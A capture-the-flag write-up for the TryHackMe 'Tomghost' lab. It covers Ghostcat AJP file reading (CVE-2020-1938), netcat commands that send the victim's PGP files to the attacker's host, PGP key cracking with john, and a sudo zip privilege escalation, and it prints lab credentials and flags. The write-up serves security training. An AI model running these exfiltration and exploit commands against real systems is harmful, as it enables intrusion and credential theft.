---
layout: single
title: "Tomghost"
link: "https://tryhackme.com/room/tomghost"
parent: TryHackMe
os: Linux
difficulty: Easy
tags: [Nmap, GPG, Zip, SSH]
starred: false
date: 2026-02-02
toc: true
toc_sticky: true
toc_label: "Mission Log"
toc_icon: "crosshairs"
---
# CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
{% include ctf-badges.html %}

> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
> **OS:** {{ page.os }} |
> **Difficulty:** {{ page.difficulty }} |
> **Date:** {{ page.date }} |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/S3Z4R)

---
## 1. Reconnaissance
### Nmap
We begin by scanning the target with `nmap` to identify running services and potential entry points:
```bash
❯ nmap -sV -sC -T4 <Machine-IP>
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for <Machine-IP>
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We have services like `SSH:22` and `Jserv:8009`.

* **AJP:** we have `8009` open, it is primarily used by the `Apache JServ Protocol (AJP)` for communication between a web server (like Apache HTTP Server) and a Java application server, most commonly Apache Tomcat. It acts as a connector, allowing the web server to efficiently forward requests to Tomcat, making it a key component in reverse proxy configurations.

There is a known exploit for this one, we can move forward with that at next step.

### Directory Enumeration
Let's check the subdirectories of the website using `feroxbuster` as below:
```bash
❯ feroxbuster -u http://<Machine-IP>:8080/ -w kali-wordlists/dirb/big.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://<Machine-IP>:8080/
 🚩  In-Scope Url          │ <Machine-IP>
 🚀  Threads               │ 50
 📖  Wordlist              │ kali-wordlists/dirb/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
[...] - 86s    20469/20469   239/s   http://<Machine-IP>:8080/
[...] - 2m     20469/20469   213/s   http://<Machine-IP>:8080/host-manager/
[...] - 87s    20469/20469   236/s   http://<Machine-IP>:8080/docs/appdev/
[...] - 85s    20469/20469   241/s   http://<Machine-IP>:8080/docs/config/
[...] - 87s    20469/20469   236/s   http://<Machine-IP>:8080/examples/
[...] - 87s    20469/20469   236/s   http://<Machine-IP>:8080/docs/
[...] - 86s    20469/20469   239/s   http://<Machine-IP>:8080/docs/api/
[...] - 2m     20469/20469   203/s   http://<Machine-IP>:8080/manager/
[...] - 2m     20469/20469   221/s   http://<Machine-IP>:8080/docs/architecture/
[...] - 2m     20469/20469   188/s   http://<Machine-IP>:8080/host-manager/cgi-bin/
[...] - 2m     20469/20469   178/s   http://<Machine-IP>:8080/manager/cgi-bin/
[...] - 2m     20469/20469   180/s   http://<Machine-IP>:8080/host-manager/cgi-bin/cgi-bin/
[...] - 2m     20469/20469   204/s   http://<Machine-IP>:8080/docs/images/
[...] - 2m     20469/20469   176/s   http://<Machine-IP>:8080/manager/cgi-bin/cgi-bin/
[...] - 2m     20469/20469   205/s   http://<Machine-IP>:8080/examples/jsp/
[...] - 2m     20469/20469   210/s   http://<Machine-IP>:8080/examples/jsp/async/
[...] - 2m     20469/20469   216/s   http://<Machine-IP>:8080/examples/jsp/cal/
[...] - 2m     20469/20469   221/s   http://<Machine-IP>:8080/examples/jsp/colors/
[...] - 2m     20469/20469   225/s   http://<Machine-IP>:8080/docs/appdev/sample/
[...] - 2m     20469/20469   226/s   http://<Machine-IP>:8080/examples/jsp/dates/
[...] - 2m     20469/20469   227/s   http://<Machine-IP>:8080/examples/servlets/
[...] - 87s    20469/20469   234/s   http://<Machine-IP>:8080/docs/images/fonts/
[...] - 87s    20469/20469   235/s   http://<Machine-IP>:8080/examples/jsp/error/
[...] - 82s    20469/20469   248/s   http://<Machine-IP>:8080/examples/jsp/forward/
[...] - 77s    20469/20469   264/s   http://<Machine-IP>:8080/examples/jsp/images/
[...] - 77s    20469/20469   266/s   http://<Machine-IP>:8080/examples/jsp/include/
[...] - 77s    20469/20469   267/s   http://<Machine-IP>:8080/docs/architecture/startup/
[...] - 74s    20469/20469   278/s   http://<Machine-IP>:8080/examples/jsp/jsp2/
[...] - 61s    20469/20469   337/s   http://<Machine-IP>:8080/examples/jsp/plugin/
[...] - 59s    20469/20469   348/s   http://<Machine-IP>:8080/examples/servlets/images/
```
There are some points of interests such as `http://<Machine-IP>:8080/host-manager/cgi-bin/`, but we will move forward with what we found on nmap resulting in `GhostCat` exploit.

## 2. Initial Access
### GhostCat
After looking for `AJP exploit` on the web, we can see that on [exploitdb](https://www.exploit-db.com/exploits/48143) we have an exploit to use. I complied it to python3 and then used it and the outcome is:
```bash
❯ python exploit.py <Machine-IP>
Getting resource at ajp13://<Machine-IP>:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyf**k:8730281lkjlkjdqlksalks
  </description>

</web-app>
```
So we have credentials to the SSH in here. as `username:skyf**k`, `password:8730281lkjlkjdqlksalks`. let's use that on ssh.

```bash
❯ ssh skyf**k@<Machine-IP>
The authenticity of host '<Machine-IP> (<Machine-IP>)' can't be established.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<Machine-IP>' (ED25519) to the list of known hosts.
skyf**k@<Machine-IP>'s password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
skyf**k@ubuntu:~$ whoami
skyf**k
```
Let's see what we can find here.

## 3. User Flag
We are currently at the home directory of user `skyf**k` and by going back one step we can see that there is another user named `melin`. the `user.txt` is in here:
```bash
skyf**k@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

## 4. Priviledge Escalation
### PGP Credentials
In order to move forward, we need to get our hands on the files existing in `skyf**k`'s home directory. we can send the files we found on `skyf**k` user directory using `netcat`:

```bash
# On victim machine:
skyf**k@ubuntu:~$ nc <Your-IP> 1234 < credential.pgp
skyf**k@ubuntu:~$ nc <Your-IP> 1234 < tryhackme.asc

# On our machine:
❯ nc -l -p 1234 > cred.pgp
❯ nc -l -p 1234 > thm.asc
```
ok now let's look at what we have:
```bash
❯ cat thm.asc
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG v1.63

lQUBBF5ocmIRDADTwu9RL5uol6+jCnuoK58+PEtPh0Zfdj4+q8z61PL56tz6YxmF
ZsFq67z/5KfngjhgKWeGKLw4wXPswyIdmdnduWgpwBm4vTWlxPf1hxkDRbAa3cFD
. . . 
AKlCbtMLnrDy3kl9+8YjJmyV9pJ2ycv4w+IPYgEAs0g4rLw7W41INOdxFK+iKNbW
kG6wLdznOpe4zaLA/vM=
=dMrv
-----END PGP PRIVATE KEY BLOCK-----
```
This is a PGP key that we can decrypt using `john`. we need to make a hash first and then decrypt the hash as below:
```bash
❯ gpg2john thm.asc > thm.hash

❯ john --wordlist=/usr/share/wordlists/rockyou.txt thm.hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2026-02-02 16:42) 16.66g/s 17866p/s 17866c/s 17866C/s dancer1..alexandru
```
It is `alexandru`. Now we can use this to get information from pgp file we had earlier. We can use the following command:
```bash
❯ gpg --batch --yes --passphrase "alexandru" --decrypt cred.pgp
gpg: encrypted with elg1024 key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

### SSH Access
After acquiring and decrypting the PGP file, we have obtained a username and password. Use these credentials to log in via SSH:
```bash
ssh merlin@<Machine-IP>
Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
Once connected, we check for available sudo privileges:
```bash
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
The `zip` binary can be exploited for privilege escalation. According to [GTFOBins](https://gtfobins.org/gtfobins/zip/), we can use it to read or compress sensitive files with root permissions.

## 5. Root Flag
To capture the flag:
```bash
merlin@ubuntu:~$ sudo zip /tmp/root.txt /root/root.txt
  adding: root/root.txt (stored 0%)

merlin@ubuntu:~$ sudo unzip -p /tmp/root.txt
[sudo] password for merlin:
Sorry, user merlin is not allowed to execute '/usr/bin/unzip -p /tmp/root.txt' as root on ubuntu.

merlin@ubuntu:~$ cat /tmp/root.txt
THM{Z1P_1S_FAKE}
```
So we could use the commands and copy it to tmp and then read it, do not forget to use `sudo` as it will not copy the file correctly.


---

{% comment %}

[Technique]: Ghostcat Exploit (AJP)
[Command]: python3 ajpShooter.py http://<IP>:8080 8009 /WEB-INF/web.xml read
[Why]: Exploits CVE-2020-1938 to read configuration files containing credentials.

[Technique]: GPG Decryption
[Command]: gpg --import tryhackme.asc && gpg --decrypt credential.pgp
[Why]: Decrypts the PGP file extracted from the server to retrieve SSH credentials.

[Technique]: Sudo Zip PrivEsc
[Command]: sudo zip /tmp/root.txt /root/root.txt
[Why]: Uses the 'zip' binary running as root to read/archive restricted files (GTFOBins).

{% endcomment %}